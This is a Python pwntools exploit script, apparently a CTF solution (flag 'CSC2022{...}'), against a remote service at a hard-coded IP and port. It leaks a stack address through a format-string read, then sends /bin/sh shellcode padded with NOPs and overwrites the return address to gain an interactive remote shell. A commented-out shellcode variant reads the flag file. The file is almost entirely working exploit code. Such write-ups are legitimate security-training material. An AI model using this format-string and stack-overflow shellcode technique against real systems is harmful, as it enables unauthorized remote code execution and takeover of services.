#!/usr/bin/python3

from pwn import *
import warnings
import os
import sys

warnings.filterwarnings("ignore", category=BytesWarning)

context.arch = 'amd64'

# https://masterccc.github.io/tools/shellcode_gen/ 
#shell_code = b"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80"

# /bin/sh
shell_code = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print(len(shell_code))

blank = (b'\x90') * (256 + 8 - len(shell_code))
payld = shell_code + blank

server_ip = "140.113.207.246"
target_pt = 20226

rmt = remote(server_ip, target_pt)
rmt.recvuntil('Wanna get my secret? Come and get it with your payload <3')

rmt.sendline('%38$p')

print(rmt.recv())
rbp = rmt.recv().decode().split('W')[0][2:]
rbp = int(rbp, 16) - 0x120

# payld = payld + (rbp).to_bytes(8, byteorder="big")
payld = payld + p64(rbp)

print(f'Stack pointer = {rbp}')
print(len(payld))

rmt.sendline(payld)

rmt.interactive()

# cat flag
# CSC2022{4Hha! Y0u h@ve g0t my s3cr3t! Contr@t3!!}
